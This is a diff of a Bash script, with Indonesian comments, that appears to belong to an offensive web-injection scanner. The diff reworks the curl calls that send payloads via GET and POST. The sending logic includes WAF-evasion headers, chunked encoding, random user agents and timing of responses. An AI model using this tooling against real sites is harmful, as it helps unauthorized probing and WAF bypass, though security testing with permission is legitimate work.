@@ -124,19 +124,20 @@ fi
       if [ "$payload_length" -gt 250 ]; then
         chunked_headers+=(-H "Transfer-Encoding: chunked")
       fi                  
-      curl_output=$(echo "${waf_args//\"/}" | xargs command curl $proxy_flag $cookie_flag $rapid_reset_args "${chunked_headers[@]}" \
+      curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args "${chunked_headers[@]}" \
         --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
         -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
         -w "%{time_total}|%{http_code}" \
         "$send_to_url")
-        else
-      curl_output=$(echo "${waf_args//\"/}" | xargs command curl $proxy_flag $cookie_flag $rapid_reset_args \
+    else
+      # METODE GET: Menggunakan pembersihan yang sama agar header WAF terurai sempurna oleh curl
+      curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args \
         --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
         -m 12 -A "$random_ua" -s -o /dev/null \
         -w "%{time_total}|%{http_code}" \
         "${clean_target_url}${join_char}${current_param}=${active_payload}")
     fi
-    
+        
       local stopwatch
       local http_status
       stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
@@ -267,19 +268,20 @@ fi
       if [ "$payload_length" -gt 250 ]; then
         chunked_headers+=(-H "Transfer-Encoding: chunked")
       fi                 
-      curl_output=$(echo "${waf_args//\"/}" | xargs command curl $proxy_flag $cookie_flag $rapid_reset_args "${chunked_headers[@]}" \
+      curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args "${chunked_headers[@]}" \
         --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
         -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
         -w "%{time_total}|%{http_code}" \
         "$send_to_url")
     else
-          
-      curl_output=$(echo "${waf_args//\"/}" | xargs command curl $proxy_flag $cookie_flag $rapid_reset_args \
+      # METODE GET: Menggunakan pembersihan yang sama agar header WAF terurai sempurna oleh curl
+      curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args \
         --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
         -m 12 -A "$random_ua" -s -o /dev/null \
         -w "%{time_total}|%{http_code}" \
         "${clean_target_url}${join_char}${current_param}=${active_payload}")
     fi
+      
         local stopwatch
         local http_status
         stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
